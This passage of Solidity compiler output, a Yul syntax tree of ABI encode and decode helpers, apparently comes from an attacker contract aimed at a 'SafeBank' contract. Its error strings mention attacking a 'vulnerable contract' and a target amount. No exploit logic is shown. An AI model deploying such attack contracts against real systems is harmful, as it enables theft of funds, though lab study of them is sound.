                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "dataEnd",
                            "nodeType": "YulIdentifier",
                            "src": "384:7:4"
                          },
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "393:9:4"
                          }
                        ],
                        "functionName": {
                          "name": "sub",
                          "nodeType": "YulIdentifier",
                          "src": "380:3:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "380:23:4"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "405:2:4",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "slt",
                      "nodeType": "YulIdentifier",
                      "src": "376:3:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "376:32:4"
                  },
                  "nodeType": "YulIf",
                  "src": "373:2:4"
                },
                {
                  "nodeType": "YulBlock",
                  "src": "435:117:4",
                  "statements": [
                    {
                      "nodeType": "YulVariableDeclaration",
                      "src": "450:15:4",
                      "value": {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "464:1:4",
                        "type": "",
                        "value": "0"
                      },
                      "variables": [
                        {
                          "name": "offset",
                          "nodeType": "YulTypedName",
                          "src": "454:6:4",
                          "type": ""
                        }
                      ]
                    },
                    {
                      "nodeType": "YulAssignment",
                      "src": "479:63:4",
                      "value": {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "name": "headStart",
                                "nodeType": "YulIdentifier",
                                "src": "514:9:4"
                              },
                              {
                                "name": "offset",
                                "nodeType": "YulIdentifier",
                                "src": "525:6:4"
                              }
                            ],
                            "functionName": {
                              "name": "add",
                              "nodeType": "YulIdentifier",
                              "src": "510:3:4"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "510:22:4"
                          },
                          {
                            "name": "dataEnd",
                            "nodeType": "YulIdentifier",
                            "src": "534:7:4"
                          }
                        ],
                        "functionName": {
                          "name": "abi_decode_t_address",
                          "nodeType": "YulIdentifier",
                          "src": "489:20:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "489:53:4"
                      },
                      "variableNames": [
                        {
                          "name": "value0",
                          "nodeType": "YulIdentifier",
                          "src": "479:6:4"
                        }
                      ]
                    }
                  ]
                }
              ]
            },
            "name": "abi_decode_tuple_t_address",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "333:9:4",
                "type": ""
              },
              {
                "name": "dataEnd",
                "nodeType": "YulTypedName",
                "src": "344:7:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "value0",
                "nodeType": "YulTypedName",
                "src": "356:6:4",
                "type": ""
              }
            ],
            "src": "297:262:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "631:196:4",
              "statements": [
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "677:16:4",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "686:1:4",
                              "type": "",
                              "value": "0"
                            },
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "689:1:4",
                              "type": "",
                              "value": "0"
                            }
                          ],
                          "functionName": {
                            "name": "revert",
                            "nodeType": "YulIdentifier",
                            "src": "679:6:4"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "679:12:4"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "679:12:4"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "dataEnd",
                            "nodeType": "YulIdentifier",
                            "src": "652:7:4"
                          },
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "661:9:4"
                          }
                        ],
                        "functionName": {
                          "name": "sub",
                          "nodeType": "YulIdentifier",
                          "src": "648:3:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "648:23:4"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "673:2:4",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "slt",
                      "nodeType": "YulIdentifier",
                      "src": "644:3:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "644:32:4"
                  },
                  "nodeType": "YulIf",
                  "src": "641:2:4"
                },
                {
                  "nodeType": "YulBlock",
                  "src": "703:117:4",
                  "statements": [
                    {
                      "nodeType": "YulVariableDeclaration",
                      "src": "718:15:4",
                      "value": {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "732:1:4",
                        "type": "",
                        "value": "0"
                      },
                      "variables": [
                        {
                          "name": "offset",
                          "nodeType": "YulTypedName",
                          "src": "722:6:4",
                          "type": ""
                        }
                      ]
                    },
                    {
                      "nodeType": "YulAssignment",
                      "src": "747:63:4",
                      "value": {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "name": "headStart",
                                "nodeType": "YulIdentifier",
                                "src": "782:9:4"
                              },
                              {
                                "name": "offset",
                                "nodeType": "YulIdentifier",
                                "src": "793:6:4"
                              }
                            ],
                            "functionName": {
                              "name": "add",
                              "nodeType": "YulIdentifier",
                              "src": "778:3:4"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "778:22:4"
                          },
                          {
                            "name": "dataEnd",
                            "nodeType": "YulIdentifier",
                            "src": "802:7:4"
                          }
                        ],
                        "functionName": {
                          "name": "abi_decode_t_uint256",
                          "nodeType": "YulIdentifier",
                          "src": "757:20:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "757:53:4"
                      },
                      "variableNames": [
                        {
                          "name": "value0",
                          "nodeType": "YulIdentifier",
                          "src": "747:6:4"
                        }
                      ]
                    }
                  ]
                }
              ]
            },
            "name": "abi_decode_tuple_t_uint256",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "601:9:4",
                "type": ""
              },
              {
                "name": "dataEnd",
                "nodeType": "YulTypedName",
                "src": "612:7:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "value0",
                "nodeType": "YulTypedName",
                "src": "624:6:4",
                "type": ""
              }
            ],
            "src": "565:262:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "898:53:4",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "915:3:4"
                      },
                      {
                        "arguments": [
                          {
                            "name": "value",
                            "nodeType": "YulIdentifier",
                            "src": "938:5:4"
                          }
                        ],
                        "functionName": {
                          "name": "cleanup_t_address",
                          "nodeType": "YulIdentifier",
                          "src": "920:17:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "920:24:4"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "908:6:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "908:37:4"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "908:37:4"
                }
              ]
            },
            "name": "abi_encode_t_address_to_t_address_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "886:5:4",
                "type": ""
              },
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "893:3:4",
                "type": ""
              }
            ],
            "src": "833:118:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "1038:82:4",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1055:3:4"
                      },
                      {
                        "arguments": [
                          {
                            "name": "value",
                            "nodeType": "YulIdentifier",
                            "src": "1107:5:4"
                          }
                        ],
                        "functionName": {
                          "name": "convert_t_contract$_SafeBank_$424_to_t_address",
                          "nodeType": "YulIdentifier",
                          "src": "1060:46:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1060:53:4"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "1048:6:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1048:66:4"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "1048:66:4"
                }
              ]
            },
            "name": "abi_encode_t_contract$_SafeBank_$424_to_t_address_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "1026:5:4",
                "type": ""
              },
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "1033:3:4",
                "type": ""
              }
            ],
            "src": "957:163:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "1272:175:4",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "1282:74:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1348:3:4"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "1353:2:4",
                        "type": "",
                        "value": "23"
                      }
                    ],
                    "functionName": {
                      "name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "1289:58:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1289:67:4"
                  },
                  "variableNames": [
                    {
                      "name": "pos",
                      "nodeType": "YulIdentifier",
                      "src": "1282:3:4"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "pos",
                            "nodeType": "YulIdentifier",
                            "src": "1377:3:4"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "1382:1:4",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "1373:3:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1373:11:4"
                      },
                      {
                        "kind": "string",
                        "nodeType": "YulLiteral",
                        "src": "1386:25:4",
                        "type": "",
                        "value": "Only owner can withdraw"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "1366:6:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1366:46:4"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "1366:46:4"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "1422:19:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1433:3:4"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "1438:2:4",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "1429:3:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1429:12:4"
                  },
                  "variableNames": [
                    {
                      "name": "end",
                      "nodeType": "YulIdentifier",
                      "src": "1422:3:4"
                    }
                  ]
                }
              ]
            },
            "name": "abi_encode_t_stringliteral_5e9f184f94ce24cc63fc5ec28c25b2861cda6fa2c12f36c889d1b47ea3eab6ac_to_t_string_memory_ptr_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "1260:3:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "end",
                "nodeType": "YulTypedName",
                "src": "1268:3:4",
                "type": ""
              }
            ],
            "src": "1126:321:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "1599:243:4",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "1609:74:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1675:3:4"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "1680:2:4",
                        "type": "",
                        "value": "57"
                      }
                    ],
                    "functionName": {
                      "name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "1616:58:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1616:67:4"
                  },
                  "variableNames": [
                    {
                      "name": "pos",
                      "nodeType": "YulIdentifier",
                      "src": "1609:3:4"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "pos",
                            "nodeType": "YulIdentifier",
                            "src": "1704:3:4"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "1709:1:4",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "1700:3:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1700:11:4"
                      },
                      {
                        "kind": "string",
                        "nodeType": "YulLiteral",
                        "src": "1713:34:4",
                        "type": "",
                        "value": "Need to send some Ether to attac"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "1693:6:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1693:55:4"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "1693:55:4"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "pos",
                            "nodeType": "YulIdentifier",
                            "src": "1769:3:4"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "1774:2:4",
                            "type": "",
                            "value": "32"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "1765:3:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1765:12:4"
                      },
                      {
                        "kind": "string",
                        "nodeType": "YulLiteral",
                        "src": "1779:27:4",
                        "type": "",
                        "value": "k less than target amount"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "1758:6:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1758:49:4"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "1758:49:4"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "1817:19:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1828:3:4"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "1833:2:4",
                        "type": "",
                        "value": "64"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "1824:3:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1824:12:4"
                  },
                  "variableNames": [
                    {
                      "name": "end",
                      "nodeType": "YulIdentifier",
                      "src": "1817:3:4"
                    }
                  ]
                }
              ]
            },
            "name": "abi_encode_t_stringliteral_8e3800e9eafff4909e80fdc3507dff7830a2f1e25b0abc3ede30690336dbe179_to_t_string_memory_ptr_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "1587:3:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "end",
                "nodeType": "YulTypedName",
                "src": "1595:3:4",
                "type": ""
              }
            ],
            "src": "1453:389:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "1994:248:4",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "2004:74:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "2070:3:4"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "2075:2:4",
                        "type": "",
                        "value": "62"
                      }
                    ],
                    "functionName": {
                      "name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "2011:58:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2011:67:4"
                  },
                  "variableNames": [
                    {
                      "name": "pos",
                      "nodeType": "YulIdentifier",
                      "src": "2004:3:4"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "pos",
                            "nodeType": "YulIdentifier",
                            "src": "2099:3:4"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "2104:1:4",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "2095:3:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "2095:11:4"
                      },
                      {
                        "kind": "string",
                        "nodeType": "YulLiteral",
                        "src": "2108:34:4",
                        "type": "",
                        "value": "Target amount must be less than "
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "2088:6:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2088:55:4"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "2088:55:4"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "pos",
                            "nodeType": "YulIdentifier",
                            "src": "2164:3:4"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "2169:2:4",
                            "type": "",
                            "value": "32"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "2160:3:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "2160:12:4"
                      },
                      {
                        "kind": "string",
                        "nodeType": "YulLiteral",
                        "src": "2174:32:4",
                        "type": "",
                        "value": "balance of vulnerable contract"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "2153:6:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2153:54:4"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "2153:54:4"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "2217:19:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "2228:3:4"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "2233:2:4",
                        "type": "",
                        "value": "64"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "2224:3:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2224:12:4"
                  },
                  "variableNames": [
                    {
                      "name": "end",
                      "nodeType": "YulIdentifier",
                      "src": "2217:3:4"
                    }
                  ]
                }
              ]
            },
            "name": "abi_encode_t_stringliteral_a1aa1da52f27072dbbd9a5344e55e8540252ac7449a2689f67bbdecf91209156_to_t_string_memory_ptr_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "1982:3:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "end",
                "nodeType": "YulTypedName",
                "src": "1990:3:4",
                "type": ""
              }
            ],
            "src": "1848:394:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "2313:53:4",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "2330:3:4"
                      },
                      {
                        "arguments": [
                          {
                            "name": "value",
                            "nodeType": "YulIdentifier",
                            "src": "2353:5:4"
                          }
                        ],
                        "functionName": {
                          "name": "cleanup_t_uint256",
                          "nodeType": "YulIdentifier",
                          "src": "2335:17:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "2335:24:4"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "2323:6:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2323:37:4"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "2323:37:4"
                }
              ]
            },
            "name": "abi_encode_t_uint256_to_t_uint256_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "2301:5:4",
                "type": ""
              },
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "2308:3:4",
                "type": ""
              }
            ],
            "src": "2248:118:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "2470:124:4",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "2480:26:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "headStart",
                        "nodeType": "YulIdentifier",
                        "src": "2492:9:4"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "2503:2:4",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "2488:3:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2488:18:4"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "2480:4:4"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "value0",
                        "nodeType": "YulIdentifier",
                        "src": "2560:6:4"
                      },
                      {
                        "arguments": [
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "2573:9:4"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "2584:1:4",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "2569:3:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "2569:17:4"
                      }
                    ],
                    "functionName": {
                      "name": "abi_encode_t_address_to_t_address_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "2516:43:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2516:71:4"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "2516:71:4"
                }
              ]
            },
            "name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "2442:9:4",
                "type": ""
              },
              {
                "name": "value0",
                "nodeType": "YulTypedName",
                "src": "2454:6:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "tail",
                "nodeType": "YulTypedName",
                "src": "2465:4:4",
                "type": ""
              }
            ],
            "src": "2372:222:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "2714:140:4",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "2724:26:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "headStart",
                        "nodeType": "YulIdentifier",
                        "src": "2736:9:4"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "2747:2:4",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "2732:3:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2732:18:4"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "2724:4:4"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "value0",
                        "nodeType": "YulIdentifier",
                        "src": "2820:6:4"
                      },
                      {
                        "arguments": [
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "2833:9:4"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "2844:1:4",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "2829:3:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "2829:17:4"
                      }
                    ],
                    "functionName": {
                      "name": "abi_encode_t_contract$_SafeBank_$424_to_t_address_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "2760:59:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2760:87:4"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "2760:87:4"
                }
              ]
            },
            "name": "abi_encode_tuple_t_contract$_SafeBank_$424__to_t_address__fromStack_reversed",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "2686:9:4",
                "type": ""
              },
              {
                "name": "value0",
                "nodeType": "YulTypedName",
                "src": "2698:6:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "tail",
                "nodeType": "YulTypedName",
                "src": "2709:4:4",
                "type": ""
              }
            ],
            "src": "2600:254:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "3031:248:4",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "3041:26:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "headStart",
                        "nodeType": "YulIdentifier",
                        "src": "3053:9:4"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "3064:2:4",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "3049:3:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "3049:18:4"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "3041:4:4"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "3088:9:4"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "3099:1:4",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "3084:3:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "3084:17:4"
                      },
                      {
                        "arguments": [
                          {
                            "name": "tail",
                            "nodeType": "YulIdentifier",
                            "src": "3107:4:4"
                          },
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "3113:9:4"
                          }
                        ],
                        "functionName": {
                          "name": "sub",
                          "nodeType": "YulIdentifier",
                          "src": "3103:3:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "3103:20:4"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "3077:6:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "3077:47:4"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "3077:47:4"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "3133:139:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "tail",
                        "nodeType": "YulIdentifier",
                        "src": "3267:4:4"
                      }
                    ],
                    "functionName": {
                      "name": "abi_encode_t_stringliteral_5e9f184f94ce24cc63fc5ec28c25b2861cda6fa2c12f36c889d1b47ea3eab6ac_to_t_string_memory_ptr_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "3141:124:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "3141:131:4"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "3133:4:4"
                    }
                  ]
                }
              ]
            },
            "name": "abi_encode_tuple_t_stringliteral_5e9f184f94ce24cc63fc5ec28c25b2861cda6fa2c12f36c889d1b47ea3eab6ac__to_t_string_memory_ptr__fromStack_reversed",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "3011:9:4",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "tail",
                "nodeType": "YulTypedName",
                "src": "3026:4:4",
                "type": ""
              }
            ],
            "src": "2860:419:4"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "3456:248:4",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "3466:26:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "headStart",
                        "nodeType": "YulIdentifier",
                        "src": "3478:9:4"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "3489:2:4",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "3474:3:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "3474:18:4"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "3466:4:4"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "3513:9:4"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "3524:1:4",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "3509:3:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "3509:17:4"
                      },
                      {
                        "arguments": [
                          {
                            "name": "tail",
                            "nodeType": "YulIdentifier",
                            "src": "3532:4:4"
                          },
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "3538:9:4"
                          }
                        ],
                        "functionName": {
                          "name": "sub",
                          "nodeType": "YulIdentifier",
                          "src": "3528:3:4"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "3528:20:4"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "3502:6:4"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "3502:47:4"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "3502:47:4"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "3558:139:4",
                  "value": {
                    "arguments": [
                      {
                        "name": "tail",
                        "nodeType": "YulIdentifier",
                        "src": "3692:4:4"
                      }
                    ],
                    "functionName": {
